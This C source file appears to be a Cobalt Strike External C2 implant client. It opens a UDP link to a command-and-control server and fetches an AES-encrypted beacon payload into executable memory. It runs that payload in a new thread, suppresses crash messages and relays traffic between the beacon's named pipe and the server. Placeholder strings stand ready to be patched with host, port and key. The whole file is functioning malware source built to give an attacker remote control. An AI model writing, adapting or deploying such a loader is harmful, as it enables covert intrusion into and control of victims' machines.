/**
 * client.c
 *
 * Program to provide UDP communications for Cobalt Strike using the External C2 feature.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>

#include "aes.h"
#include "base64.h"

#define CBC 1
#define MAX 4096
#define IV_MAX_SIZE 16
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024
#define PACKET_SIZE 1024			//Max payload size. Must be same as in server.py.
									//Note that actual payload sent will have size PACKET_SIZE + 4 due to sequence number.

// #define SA struct sockaddr

#ifdef DEBUG
	#define _DEBUG 1
#else
	#define _DEBUG 0
#endif

#define debug_print(fmt, ...) \
            do { if (_DEBUG) fprintf(stderr, fmt, __VA_ARGS__); } while (0)

static DWORD server_seqnum = 0;
static DWORD my_seqnum = 0;


/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to an array containing the IP address to connect to
 * @param port A pointer to an array containing the port to connect on
 * @param timeout_sec An int to specify socket timeout
 * @return A socket handle for the connection
*/
SOCKET create_socket(char* ip, char* port, int timeout_sec)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		debug_print("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_protocol = IPPROTO_UDP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		debug_print("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		debug_print("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Set socket timeout
	// Note: Windows timeout value is a DWORD in milliseconds, address passed to setsockopt() is const char *
	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_sec, sizeof(timeout_sec)) < 0) {
			debug_print("%s", "setsockopt rcvtimeout failed\n");
			return INVALID_SOCKET;
		}
	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_sec, sizeof(timeout_sec)) < 0) {
        	debug_print("%s", "setsockopt sndtimeout failed\n");
			return INVALID_SOCKET;
		}

	// "Connect" to server.
	// We can call send/recv with UDP because we are calling connect() here
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		debug_print("Connection Failure: %ld\n", WSAGetLastError());
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		debug_print("%s", "Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}


/**
 * Sends data to server received from our injected beacon
 *
 * @param sd A socket file descriptor
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
 * @param retries Number of times to retry recv after a timeout
 * @return Number of bytes sent
*/
int sendData(SOCKET sd, const char* data, DWORD len, int retries) {
	int socketsReady = 0;
	int iResult = 0;
	int error = 0;
	int _retries = retries;
	char* sizepacket = malloc(8);
	if (sizepacket == NULL)
	{
		debug_print("%s", "Malloc failed\n");
		return -1;
	}
	char* ackpacket = malloc(4);
	if (ackpacket == NULL)
	{
		debug_print("%s", "Malloc failed\n");
		free(sizepacket);
		return -1;
	}
	memcpy(sizepacket, &my_seqnum, 4);
	memcpy((sizepacket+4), &len, 4); 
	while(_retries > 0) {
		iResult = send(sd, sizepacket, 8, 0);
		if (iResult == SOCKET_ERROR)
			{
				debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
				free(sizepacket);
				free(ackpacket);
				return(-1);
			}
		
		iResult = recv(sd, ackpacket, 3, 0);
		if (iResult == SOCKET_ERROR)
		{
			error = WSAGetLastError();
			if (error == WSAETIMEDOUT)
			{
				_retries--;
				debug_print("Recv timeout in sendData, retires left: %d\n", _retries);
				continue;
			}
			debug_print("recvfrom in recvData failed with error %d\n", error);
			free(sizepacket);
			free(ackpacket);
			return(-1);
		}
		// Changed ACK to 123
		if (*(ackpacket) == 0x31 && *(ackpacket+1) == 0x32 && *(ackpacket+2) == 0x33) 
		{
			my_seqnum++;
			break;
		}
		_retries--;
		memset(ackpacket, 0, 4);
		
	}
	if (_retries <= 0)
	{
		debug_print("%s", "No more retries, exiting\n");
		free(sizepacket);
		free(ackpacket);
		return(-1);
	}
	char* packet = calloc(PACKET_SIZE+4, 1);
	if (packet == NULL)
	{
		debug_print("%s", "Couldnt calloc\n");
		free(sizepacket);
		free(ackpacket);
		return(-1);
	}
	// Reset retries
	_retries = retries;

	memset(ackpacket, 0, 4);
	int remaining = len;
	debug_print("Sending %d bytes.\n", len);
	while (remaining > 0) {
		DWORD temp = 0;
		memcpy(packet, &my_seqnum, 4);
		memcpy((packet + 4), (data + (len-remaining)), PACKET_SIZE);
		while(_retries > 0) {
			if (remaining >= PACKET_SIZE) 
			{
				temp = send(sd, packet, PACKET_SIZE+4, 0);
				if (temp == SOCKET_ERROR)
					{
						debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
						free(sizepacket);
						free(ackpacket);
						return(-1);
					}
			} 
			else 
			{
				temp = send(sd, packet, remaining+4, 0);
				if (temp == SOCKET_ERROR)
					{
						debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
						free(sizepacket);
						free(ackpacket);
						return(-1);
					}
			}
			
			debug_print("sent: %d bytes\n", temp);
			
			iResult = recv(sd, ackpacket, 3, 0);
			if (iResult == SOCKET_ERROR)
			{
				error = WSAGetLastError();
				if (error == WSAETIMEDOUT)
				{
					_retries--;
					debug_print("Recv timeout in sendData, retires left: %d\n", _retries);
					continue;
				}
				debug_print("recvfrom in recvData failed with error %d\n", error);
				free(sizepacket);
				free(ackpacket);
				return(-1);
			}
			
			// debug_print("contents of ackpacket: %s\n", ackpacket);
			// Changed ACK to 123
			if (*(ackpacket) == 0x31 && *(ackpacket+1) == 0x32 && *(ackpacket+2) == 0x33) {
				my_seqnum++;
				remaining = remaining - temp + 4;
				break;
			}
			// Not sure why I had this..
			//_retries--;
			memset(ackpacket, 0, 4);
			
		}
		if (_retries <= 0)
		{
			debug_print("%s", "No more retries, exiting\n");
			free(sizepacket);
			free(ackpacket);
			return(-1);
		}
		_retries = retries;
		memset(packet, 0, PACKET_SIZE+4);
	}

	free(sizepacket);
	free(ackpacket);
	free(packet);
	return len;
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 * TODO - this method could include some robustness to out-of-order transmission instead of just doing the ACK dance. 
 *			I was thinking maybe an array to keep track of which sections of the payload buffer are filled.
 *
 * @param sd A socket file descriptor
 * @param buffer Buffer to store data in
 * @param max unused
 * @param retries Number of times to retry recv after a timeout
 * @return Size of data recieved
*/
DWORD recvData(SOCKET sd, char * buffer, DWORD max, int retries) {
	debug_print("%s", "Receiving Data\n");
	DWORD size = 0, total = 0, temp = 0, seqnum = 0;
	int iResult = 0;
	int _retries = retries;
	int error = 0;

	char* sizePacket = malloc(8);
	if (sizePacket == NULL)
	{
		debug_print("%s", "Couldnt malloc\n");
		return(-1);
	}

	/* read the 4-byte length */
	while (_retries > 0) {
		iResult = recv(sd, sizePacket, 8, 0);
		if (iResult == SOCKET_ERROR)
		{
			error = WSAGetLastError();
			if (error == WSAETIMEDOUT)
			{
				_retries--;
				debug_print("Recv timeout in recvData, retires left: %d\n", _retries);
				continue;
			}
			debug_print("recvfrom in recvData failed with error %d\n", error);
			free(sizePacket);
			return(-1);
		}

		seqnum = *((DWORD*)sizePacket);
		if (seqnum <= server_seqnum) {
			iResult = send(sd, "123", 4, 0);
			if (iResult == SOCKET_ERROR)
			{
				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
				free(sizePacket);
				return(-1);
			}
			
			if (seqnum == server_seqnum) {
				// debug_print("%s", "Seqnum matched, sent ACK (123)\n");
				server_seqnum++;							//Note: under this implementation, there is a limit to the number of packets per connection.
				size = *((DWORD*)(sizePacket + 4));			//Once the sequence number overflows, this breaks. 
				break;
			} else {
				debug_print("%s", "Received out of order on size packet.\n");
				_retries--;
			}
		}
	}
	if (_retries <= 0)
	{
		debug_print("%s", "No more retries, exiting\n");
		free(sizePacket);
		return(-1);
	}

	debug_print("Size: %d\n", size);

	char* packet = calloc(PACKET_SIZE+4, 1);
	if (packet == NULL)
	{
		debug_print("%s", "Couldnt calloc\n");
		free(sizePacket);
		return(-1);
	}
	// Reset retries
	_retries = retries;
	/* read in the data */
	while (_retries > 0 && total < size) {
		temp = recv(sd, packet, PACKET_SIZE+4, 0);
		if (temp == SOCKET_ERROR)
		{
			error = WSAGetLastError();
			if (error == WSAETIMEDOUT)
			{
				_retries--;
				debug_print("Recv timeout in recvData, retires left: %d\n", _retries);
				continue;
			}
			debug_print("recvfrom in recvData failed with error %d\n", error);
			free(packet);
			free(sizePacket);
			return -1;
		}
		seqnum = *((DWORD*) packet);
		// debug_print("seqnum: %d\n", seqnum);
		if (seqnum <= server_seqnum)
		{
			iResult = send(sd, "123", 4, 0);
			if (iResult == SOCKET_ERROR)
			{
				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
				free(packet);
				free(sizePacket);
				return(-1);
			}
			if (seqnum == server_seqnum)
			{
				// debug_print("%s", "Seqnum matched, sent ACK (123)\n");
				server_seqnum++;
				memcpy((buffer + total), (packet + 4), temp - 4);
				total += temp - 4;
				continue;
			}
			else
			{
				debug_print("%s", "Received out of order on size packet.\n");
			}
		}
		_retries--;
		debug_print("Retries: %d\n", _retries);
		memset(packet, 0, PACKET_SIZE+4);	
	}
	if (_retries <= 0)
	{
		debug_print("%s", "No more retries, exiting\n");
		size = -1;
	}
	free(packet);
	free(sizePacket);
	// debug_print("Size: %d\tTotal: %d\tTemp: %d\n", size, total, temp);
	return total;

}

/**
 * Initiate connection with server via a UDP three-way handshake
 * 
 * @param sd A socket file descriptor
 * @param retries Number of times to retry recv after a timeout
 * @return Return 0 on success
 */
int threeWayHandshake(SOCKET sd, int retries) {
	int _retries = retries;
	int iResult = 0;
	int error = 0;
	char* synack = calloc(4, 1);
	if (synack == NULL)
	{
		debug_print("%s", "Couldnt calloc\n");
		return(-1);
	}
	while (_retries > 0) {
		debug_print("In handshake, sending my_seqnum of %d\n", my_seqnum);
		iResult = send(sd, (char *)&my_seqnum, 4, 0);
		if (iResult == SOCKET_ERROR)
		{
			debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
			free(synack);
			return(-1);
		}
		iResult = recv(sd, synack, 4, 0);
		if (iResult == SOCKET_ERROR)
		{
			error = WSAGetLastError();
			if (error == WSAETIMEDOUT)
			{
				_retries--;
				debug_print("Recv timeout in threeWayHandshake, retires left: %d\n", _retries);
				continue;
			}
			debug_print("recvfrom in threeWayHandshake failed with error %d\n", error);
			free(synack);
			return(-1);
		}
		server_seqnum = *(DWORD*)(synack);
		debug_print("recv server_seqnum of %d\n", server_seqnum);
		server_seqnum++;
		my_seqnum++;
		break;
	}
	if (_retries <= 0)
	{
		debug_print("%s", "No more retries, exiting\n");
		free(synack);
		return(-1);
	}
	iResult = send(sd, "123", 4, 0);
	debug_print("%s", "Sent ACK (123)\n");
	if (iResult == SOCKET_ERROR)
	{
		debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
		free(synack);
		return(-1);
	}
	free(synack);
	return(0);
}


/**
 * Read a frame from a handle
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Write a frame to a file
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


/**
 * Main function. Connects to server over UDP, gets beacon and spawns it, then enters send/recv loop
 *
 */
int main(int argc, char* argv[])
//TODO - add argument for IPv4 vs IPv6. TCP allows for protocol-agnostic sockets, UDP does not. 
{
	// Set connection info
	if (argc != 1)
	{
		debug_print("Incorrect number of args: %d\n", argc);
		debug_print("Incorrect number of args: %s", argv[0]);
		exit(0);
	}

	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	//char* IP = argv[1];
	char IP[50] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	//char* PORT = argv[2];
	char PORT[50] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
	my_seqnum = 0;
	server_seqnum = 0;
	
	char pipe_str[50] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
	//strncpy(pipe_str, argv[3], sizeof(pipe_str));

	int sleep;
	//sleep = atoi(argv[4]);
	sleep = atoi("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");

	int TIMEOUT;
	//TIMEOUT = atoi(argv[5])*1000;
	TIMEOUT = atoi("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")*1000;

	int RETRIES;
	//RETRIES = atoi(argv[6]);
	RETRIES = atoi("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");

	char key[100] = "GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"\
					"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG";

	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	int iResult = 0;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT, TIMEOUT);
	if (sockfd == INVALID_SOCKET)
	{
		debug_print("%s", "Socket creation error!\n");
		return 0;
	}
	debug_print("%s", "Socket Created\n");

	// run 3-way handshake with beacon
	iResult = threeWayHandshake(sockfd, RETRIES);
	if (iResult != 0)
	{
		debug_print("%s", "threeWayHandshake returned error\n");
		closesocket(sockfd);
		return 0;
	}
	debug_print("%s", "Handshake completed.\n");

	// Recv beacon payload
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
	{
		debug_print("%s", "payload buffer malloc failed!\n");
		closesocket(sockfd);
		return 0;
	}

	char * iv = (char *)calloc(IV_MAX_SIZE, sizeof(char));
	if (iv == NULL)
	{
		debug_print("%s", "iv malloc failed!\n");
		closesocket(sockfd);
		free(payload);
		return 0;
	}
	char * ct = (char *)calloc(BUFFER_MAX_SIZE, sizeof(char));
	if (ct == NULL)
	{
		debug_print("%s", "ct malloc failed!\n");
		closesocket(sockfd);
		free(iv);
		free(payload);
		return 0;
	}
	char * b64iv = (char *)calloc(IV_MAX_SIZE*2, sizeof(char));
	if (b64iv == NULL)
	{
		debug_print("%s", "b64ct malloc failed!\n");
		closesocket(sockfd);
		free(iv);
		free(ct);
		free(payload);
		return 0;
	}
	char * b64ct = (char *)calloc(BUFFER_MAX_SIZE, sizeof(char));
	if (b64ct == NULL)
	{
		debug_print("%s", "b64ct malloc failed!\n");
		closesocket(sockfd);
		free(iv);
		free(ct);
		free(b64iv);
		free(payload);
		return 0;
	}

	DWORD iv_size = recvData(sockfd, b64iv, IV_MAX_SIZE, RETRIES);
	DWORD ct_size = recvData(sockfd, b64ct, PAYLOAD_MAX_SIZE, RETRIES);
	if (ct_size < 0 || iv_size < 0)
	{
		debug_print("%s", "recvData error, exiting\n");
		closesocket(sockfd);
		free(iv);
		free(ct);
		free(b64iv);
		free(b64ct);
		free(payload);
		return 0;
	}

	iv_size = Base64decode(iv, b64iv);
	ct_size = Base64decode(ct, b64ct);

	// Decrypt payload
	struct AES_ctx ctx;
	//AES_init_ctx(&ctx, key);
	AES_init_ctx_iv(&ctx, (uint8_t *) key, (uint8_t *) iv);
	AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) ct, ct_size);

	memcpy(payload, ct, ct_size);

	free(iv);
	free(ct);
	free(b64iv);
	free(b64ct);
	/* inject the payload stage into the current process */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);

	debug_print("%s", "Thread Created, payload received intact\n");

	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, pipe_str);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	}
	debug_print("%s", "Connected to pipe!!\n");
	free(iv);
	free(ct);
	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		debug_print("%s", "buffer malloc failed!\n");
		closesocket(sockfd);
		CloseHandle(beaconPipe);
		free(iv);
		free(ct);
		free(payload);
		return 0;
	}

	while (1) {
		// Start the pipe dance
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size <= 0)
		{
			debug_print("%s", "read_frame error, exiting\n");
			break;
		}
		debug_print("Recv %d bytes from beacon\n", read_size);
		
		if (read_size == 1)
		{
			debug_print("Finished sending, sleeping %d seconds..\n", sleep);
			Sleep(sleep*1000);
		}

		int send_size = sendData(sockfd, buffer, read_size, RETRIES);
		if (send_size < 0)
		{
			debug_print("%s", "sendData error, exiting\n");
			break;
		}
		debug_print("%s", "Sent to TS\n");
		
		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE, RETRIES);
		if (read_size <= 0)
		{
			debug_print("%s", "recvData error, exiting\n");
			break;
		}
		debug_print("Recv %d bytes from TS\n", read_size);

		write_frame(beaconPipe, buffer, read_size);
		debug_print("%s", "Sent to beacon\n");
	}
	free(payload);
	free(buffer);
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	return 0;
}

